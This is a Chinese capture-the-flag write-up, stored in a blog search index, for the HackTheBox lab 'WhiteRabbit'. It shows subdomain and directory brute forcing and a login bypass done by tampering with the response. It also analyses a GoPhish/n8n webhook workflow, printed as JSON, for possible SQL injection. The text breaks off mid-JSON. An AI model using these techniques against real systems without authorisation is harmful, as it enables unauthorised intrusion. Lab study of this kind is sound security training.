<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>WhiteRabbit</title>
    <url>/posts/25594414/</url>
    <content><![CDATA[<h1 id="打靶过程"><a href="#打靶过程" class="headerlink" title="打靶过程"></a>打靶过程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ nmap -sV -Pn 10.10.11.63</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/25594414/image-20250407211525618.png" class="" title="image-20250407211525618">

<p>在80端口开放了<code>Caddy</code>服务器，访问后重定向到<code>http://whiterabbit.htb</code>。</p>
<img src="/posts/25594414/image-20250407212256418.png" class="" title="image-20250407212256418">

<p>啥也没有，爆破下子域名。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ ffuf -c -u <span class="string">"http://whiterabbit.htb"</span> -H <span class="string">"Host: FUZZ.whiterabbit.htb"</span> -w 桌面/fuzzDicts-master/subdomainDicts/main.txt -t 500 -fw 1</span><br></pre></td></tr></tbody></table></figure>

<p>爆破出子域名<code>status.whiterabbit.htb</code>，访问跳转到<code>http://status.whiterabbit.htb/dashboard</code>，进行指纹识别。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ whatweb http://status.whiterabbit.htb</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/25594414/image-20250407213911205.png" class="" title="image-20250407213911205">

<img src="/posts/25594414/image-20250407214438955.png" class="" title="image-20250407214438955">

<p>尝试登录，拦截登录响应包，修改<code>false</code>为<code>true</code>。</p>
<figure class="highlight json"><table><tbody><tr><td class="code"><pre><span class="line"><span class="number">431</span><span class="punctuation">[</span><span class="punctuation">{</span><span class="attr">"ok"</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">"msg"</span><span class="punctuation">:</span><span class="string">"Incorrect username or password."</span><span class="punctuation">}</span><span class="punctuation">]</span></span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/25594414/image-20250407220139767.png" class="" title="image-20250407220139767">

<p>然后就进来了，可以找到版本为<code>1.23.13</code>。</p>
<img src="/posts/25594414/image-20250407220612253.png" class="" title="image-20250407220612253">

<p>经过了解，在<code>status</code>目录下可能存在一些状态页面，尝试爆破一下。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ dirsearch -u http://status.whiterabbit.htb/status --exclude-sizes=2KB</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/25594414/image-20250407222103397.png" class="" title="image-20250407222103397">

<img src="/posts/25594414/image-20250407222120294.png" class="" title="image-20250407222120294">

<h2 id="wikijs"><a href="#wikijs" class="headerlink" title="wikijs"></a>wikijs</h2><p>如TODO所说，这里不需要身份验证。</p>
<img src="/posts/25594414/image-20250407223241423.png" class="" title="image-20250407223241423">

<p>关注一下<code>GoPhish</code>，感觉是钓鱼攻击手册，表示从<code>webhook</code>连接到<code>n8n</code>平台。</p>
<img src="/posts/25594414/image-20250407223519674.png" class="" title="image-20250407223519674">

<h2 id="Gophish分析"><a href="#Gophish分析" class="headerlink" title="Gophish分析"></a>Gophish分析</h2><p>开始分析这个流程，首先是发送POST请求</p>
<figure class="highlight http"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>28efa8f7df.whiterabbit.htb</span><br><span class="line"><span class="attribute">x-gophish-signature</span><span class="punctuation">: </span>sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>81</span><br><span class="line"></span><br><span class="line"><span class="language-perl">{</span></span><br><span class="line"><span class="language-perl">  <span class="string">"campaign_id"</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="language-perl">  <span class="string">"email"</span>: <span class="string">"test<span class="variable">@ex</span>.com"</span>,</span></span><br><span class="line"><span class="language-perl">  <span class="string">"message"</span>: <span class="string">"Clicked Link"</span></span></span><br><span class="line"><span class="language-perl">}</span></span><br></pre></td></tr></tbody></table></figure>

<p>这个过程中检查<code>x-gophish-signature</code>标头，其使用<code>HMAC</code>的加密方式，用来保护请求不被污染，如果不知道秘钥则无法伪造签名。生成公式为<code>HMAC(request_body, secret_key)</code>。</p>
<p>之后会进行数据库操作，查询用户是否在数据库中，这里可能会导致sql注入。</p>
<p>这里还给出了一份已完成的json文件:</p>
<figure class="highlight json"><table><tbody><tr><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Gophish to Phishing Score Database"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"nodes"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"respondWith"</span><span class="punctuation">:</span> <span class="string">"text"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"responseBody"</span><span class="punctuation">:</span> <span class="string">"Error: No signature found in request header"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"c77c4304-a74e-4699-9b2c-52c7a8500fb4"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"no signature"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.respondToWebhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1.1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">660</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">620</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"respondWith"</span><span class="punctuation">:</span> <span class="string">"text"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"responseBody"</span><span class="punctuation">:</span> <span class="string">"Error: Provided signature is not valid"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"da08f3e5-60c4-4898-ab28-d9f92aae2fe2"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"invalid signature"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.respondToWebhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1.1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">1380</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">540</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"executeQuery"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"query"</span><span class="punctuation">:</span> <span class="string">"UPDATE victims\nSET phishing_score = phishing_score + 10\nWHERE email = $1;"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"queryReplacement"</span><span class="punctuation">:</span> <span class="string">"={{ $json.email }}"</span></span><br><span class="line">        <span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"e83be7d7-0c4a-4ca8-b341-3a40739f8825"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Update Phishing Score for Clicked Event"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.mySql"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2.4</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">2360</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">340</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"credentials"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"mySql"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"qEqs6Hx9HRmSTg5v"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"mariadb - phishing"</span></span><br><span class="line">        <span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"caseSensitive"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"typeValidation"</span><span class="punctuation">:</span> <span class="string">"strict"</span></span><br><span class="line">          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"ad6553f3-0e01-497a-97b5-3eba88542a11"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">"={{ $('Webhook').item.json.body.message }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"string"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"exists"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"singleValue"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"2a041864-d4b5-4c7d-a887-68792d576a73"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">"={{ $('Webhook').item.json.body.message }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="string">"Clicked Link"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"string"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"equals"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"filter.operator.equals"</span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span></span><br><span class="line">          <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"combinator"</span><span class="punctuation">:</span> <span class="string">"and"</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"c4c08710-b02c-4625-bdc3-19de5653844d"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"If Clicked"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.if"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">2120</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">320</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"executeQuery"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"query"</span><span class="punctuation">:</span> <span class="string">"UPDATE victims\nSET phishing_score = phishing_score + 50\nWHERE email = $1;"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"queryReplacement"</span><span class="punctuation">:</span> <span class="string">"={{ $json.email }}"</span></span><br><span class="line">        <span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"220e3d9d-07f1-425e-a139-a51308737a89"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Update Phishing Score for Submitted Data"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.mySql"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2.4</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">2360</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">560</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"credentials"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"mySql"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"qEqs6Hx9HRmSTg5v"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"mariadb - phishing"</span></span><br><span class="line">        <span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"caseSensitive"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"typeValidation"</span><span class="punctuation">:</span> <span class="string">"strict"</span></span><br><span class="line">          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"ad6553f3-0e01-497a-97b5-3eba88542a11"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">"={{ $('Webhook').item.json.body.message }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"string"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"exists"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"singleValue"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"2a041864-d4b5-4c7d-a887-68792d576a73"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">"={{ $('Webhook').item.json.body.message }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="string">"Submitted Data"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"string"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"equals"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"filter.operator.equals"</span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span></span><br><span class="line">          <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"combinator"</span><span class="punctuation">:</span> <span class="string">"and"</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"9f49f588-12b7-4e3a-8d1a-74898b215d60"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"If Submitted Data"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.if"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">2120</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">500</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"respondWith"</span><span class="punctuation">:</span> <span class="string">"text"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"responseBody"</span><span class="punctuation">:</span> <span class="string">"Success: Phishing score is updated"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"58eecf3c-97e9-4879-aaec-cd5759cb1ef8"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Success"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.respondToWebhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1.1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">2660</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">460</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"caseSensitive"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"typeValidation"</span><span class="punctuation">:</span> <span class="string">"strict"</span></span><br><span class="line">          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"8e2c34bd-a337-41e1-94a4-af319a991680"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">"={{ $json.signature }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="string">"={{ $json.calculated_signature }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"string"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"equals"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"filter.operator.equals"</span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span></span><br><span class="line">          <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"combinator"</span><span class="punctuation">:</span> <span class="string">"and"</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"8b12bac8-f513-422e-a582-99f67b87b24f"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Compare signature"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.if"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">1100</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">340</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"respondWith"</span><span class="punctuation">:</span> <span class="string">"text"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"responseBody"</span><span class="punctuation">:</span> <span class="string">"={{ $json.message }} | {{ JSON.stringify($json.error)}}"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"d3f8446a-81af-4e5a-894e-e0eab0596364"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"DEBUG: REMOVE SOON"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.respondToWebhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1.1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">1620</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">20</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"caseSensitive"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"typeValidation"</span><span class="punctuation">:</span> <span class="string">"strict"</span></span><br><span class="line">          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"593bdf17-d38a-49a2-8431-d29679082aae"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">"={{ $json.headers.hasField('x-gophish-signature') }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="string">"true"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"boolean"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"true"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"singleValue"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span></span><br><span class="line">          <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"combinator"</span><span class="punctuation">:</span> <span class="string">"and"</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span 